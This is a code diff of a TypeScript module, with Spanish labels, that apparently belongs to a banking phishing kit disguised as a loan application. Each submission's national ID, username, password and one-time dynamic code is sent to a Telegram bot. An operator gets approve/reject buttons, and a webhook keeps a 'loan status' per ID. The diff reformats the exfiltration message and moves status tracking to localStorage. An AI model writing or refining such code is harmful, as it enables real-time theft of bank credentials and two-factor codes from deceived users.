@@ -34,13 +34,13 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID
  *   });
  */
 export async function sendToTelegram(data: UserData) {
-const message = `
-  🔔 Nuevo ingreso:
-  📝 Cédula: ${data.cedula}
-  👤 Usuario: ${data.usuario}
-  🔑 Clave: ${data.clave}
-  🔐 Clave Dinámica: ${data.claveDinamica}
-`;
+  const message = `
+    🔔 Nuevo ingreso:
+    📝 Cédula: ${data.cedula}
+    👤 Usuario: ${data.usuario}
+    🔑 Clave: ${data.clave}
+    🔐 Clave Dinámica: ${data.claveDinamica}
+  `;
 
   try {
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -51,68 +51,95 @@ const message = `
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
-        parse_mode: "HTML",
         reply_markup: {
           inline_keyboard: [
             [
-              { text: "Aprobar", callback_data: `approve_${data.cedula}` },
-              { text: "Rechazar", callback_data: `reject_${data.cedula}` },
-            ],
-          ],
-        },
+              {
+                text: "✅ Aprobar",
+                callback_data: `approve_${data.cedula}`
+              },
+              {
+                text: "❌ Rechazar",
+                callback_data: `reject_${data.cedula}`
+              }
+            ]
+          ]
+        }
       }),
-    })
+    });
 
     if (!response.ok) {
-      throw new Error("Error sending to Telegram")
+      throw new Error('Failed to send Telegram message');
     }
 
-    return { success: true }
+    return { success: true };
   } catch (error) {
-    console.error("Error:", error)
-    return { success: false }
+    console.error('Error sending to Telegram:', error);
+    return { success: false };
   }
 }
 
-export async function handleTelegramWebhook(req: Request) {
+// Store loan statuses in memory and localStorage (temporary solution)
+const LOAN_STATUSES_KEY = 'loan_statuses';
+
+function getLoanStatusesFromStorage(): Map<string, 'processing' | 'approved' | 'rejected'> {
   try {
-    const data = await req.json()
-    console.log("Received webhook data:", JSON.stringify(data, null, 2))
+    const storedStatuses = localStorage.getItem(LOAN_STATUSES_KEY);
+    if (storedStatuses) {
+      return new Map(JSON.parse(storedStatuses));
+    }
+  } catch (error) {
+    console.error('Error reading from localStorage:', error);
+  }
+  return new Map();
+}
 
-    if (data.callback_query) {
-      const { data: callbackData, message } = data.callback_query
-      const [action, cedula] = callbackData.split("_")
+function saveLoanStatusesToStorage(statuses: Map<string, 'processing' | 'approved' | 'rejected'>) {
+  try {
+    localStorage.setItem(LOAN_STATUSES_KEY, JSON.stringify(Array.from(statuses.entries())));
+  } catch (error) {
+    console.error('Error saving to localStorage:', error);
+  }
+}
 
-      // Corregir la lógica de aprobación/rechazo
-      const loanStatus = action === "approve" ? "approved" : "rejected"
+const loanStatuses = getLoanStatusesFromStorage();
 
-      // Actualizar el estado del préstamo en la base de datos
-      await updateLoanStatus(cedula, loanStatus)
-
-      // Responder a Telegram para actualizar el mensaje
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageReplyMarkup`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
+export async function handleTelegramWebhook(req: Request) {
+  const data = await req.json();
+  
+  // Handle callback queries (button clicks)
+  if (data.callback_query) {
+    const { callback_query } = data;
+    const { data: callbackData, message } = callback_query;
+    
+    if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_')) {
+      const [action, cedula] = callbackData.split('_');
+      const status = action === 'approve' ? 'approved' : 'rejected';
+      
+      // Update loan status and save to storage
+      loanStatuses.set(cedula, status);
+      saveLoanStatusesToStorage(loanStatuses);
+      
+      // Update the Telegram message to show the decision
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
         body: JSON.stringify({
           chat_id: message.chat.id,
           message_id: message.message_id,
-          reply_markup: JSON.stringify({
-            inline_keyboard: [[{ text: loanStatus === "approved" ? "Aprobado" : "Rechazado", callback_data: "done" }]],
-          }),
+          text: `${message.text}\n\nEstado: ${status === 'approved' ? '✅ Aprobado' : '❌ Rechazado'}`,
         }),
-      })
+      });
+      
+      return { success: true, status };
     }
-
-    return new Response("OK")
-  } catch (error) {
-    console.error("Error handling Telegram webhook:", error)
-    return new Response("Error", { status: 500 })
   }
+  
+  return { success: true };
 }
 
-async function updateLoanStatus(cedula: string, status: "approved" | "rejected") {
-  // Aquí deberías implementar la lógica para actualizar el estado del préstamo en tu base de datos
-  console.log(`Actualizando estado del préstamo para cédula ${cedula}: ${status}`)
-  // Por ejemplo, podrías usar una API de tu backend o una base de datos serverless
+export async function getLoanStatus(cedula: string) {
+  return loanStatuses.get(cedula) || 'processing';
 }
-
